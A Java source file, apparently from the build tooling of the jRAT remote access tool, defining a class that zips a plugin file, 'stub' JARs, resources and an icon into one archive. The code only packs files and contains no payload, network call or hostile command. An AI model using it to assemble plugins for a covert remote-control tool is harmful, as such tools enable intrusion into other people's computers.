package se.jrat.client.build;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.List;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import javax.swing.JFileChooser;

import se.jrat.client.Main;

public class PluginPacker {
	
	private File input;
	private File icon;
	private Map<String, File> stubJars;
	private List<File> resources;
	
	public PluginPacker(File input, File icon, Map<String, File> stubJars, List<File> resources) {
		this.input = input;
		this.icon = icon;
		this.stubJars = stubJars;
		this.resources = resources;
	}
	
	public void pack() throws Exception {
		JFileChooser c = new JFileChooser();
		c.showSaveDialog(null);
		File output = c.getSelectedFile();
		
		if (output == null) {
			return;
		}
		
		long start = System.currentTimeMillis();
		Main.debug("Begin pack plugin...");
		
		ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(output));
		
		Main.debug("Writing root plugin file " + input.getName());
		FileInputStream fis = new FileInputStream(input);
		zos.putNextEntry(new ZipEntry("root/" + input.getName()));
		copy(fis, zos);
		fis.close();
		
		for (String s : stubJars.keySet()) {
			Main.debug("Writing stub JAR " + s + ".jar from " + stubJars.get(s).getAbsolutePath());
			fis = new FileInputStream(stubJars.get(s));
			zos.putNextEntry(new ZipEntry("stubs/" + s + ".jar"));
			copy(fis, zos);
			fis.close();
		}
		
		for (File file : resources) {
			Main.debug("Writing resource " + file.getName() + " from " + file.getAbsolutePath());
			fis = new FileInputStream(file);
			zos.putNextEntry(new ZipEntry(file.getName()));
			copy(fis, zos);
			fis.close();
		}
		
		Main.debug("Writing plugin icon file icon.png...");
		fis = new FileInputStream(icon);
		zos.putNextEntry(new ZipEntry("icon.png"));
		copy(fis, zos);
		fis.close();
		
		zos.close();
		
		long end = System.currentTimeMillis();
		
		Main.debug("Done packing plugin... Took " + (end - start) + " ms");
	}
	
	private void copy(InputStream input, OutputStream output) throws Exception {
		byte[] buffer = new byte[1024];
		int bytesRead;
		while ((bytesRead = input.read(buffer)) != -1) {
			output.write(buffer, 0, bytesRead);
		}
	}

}
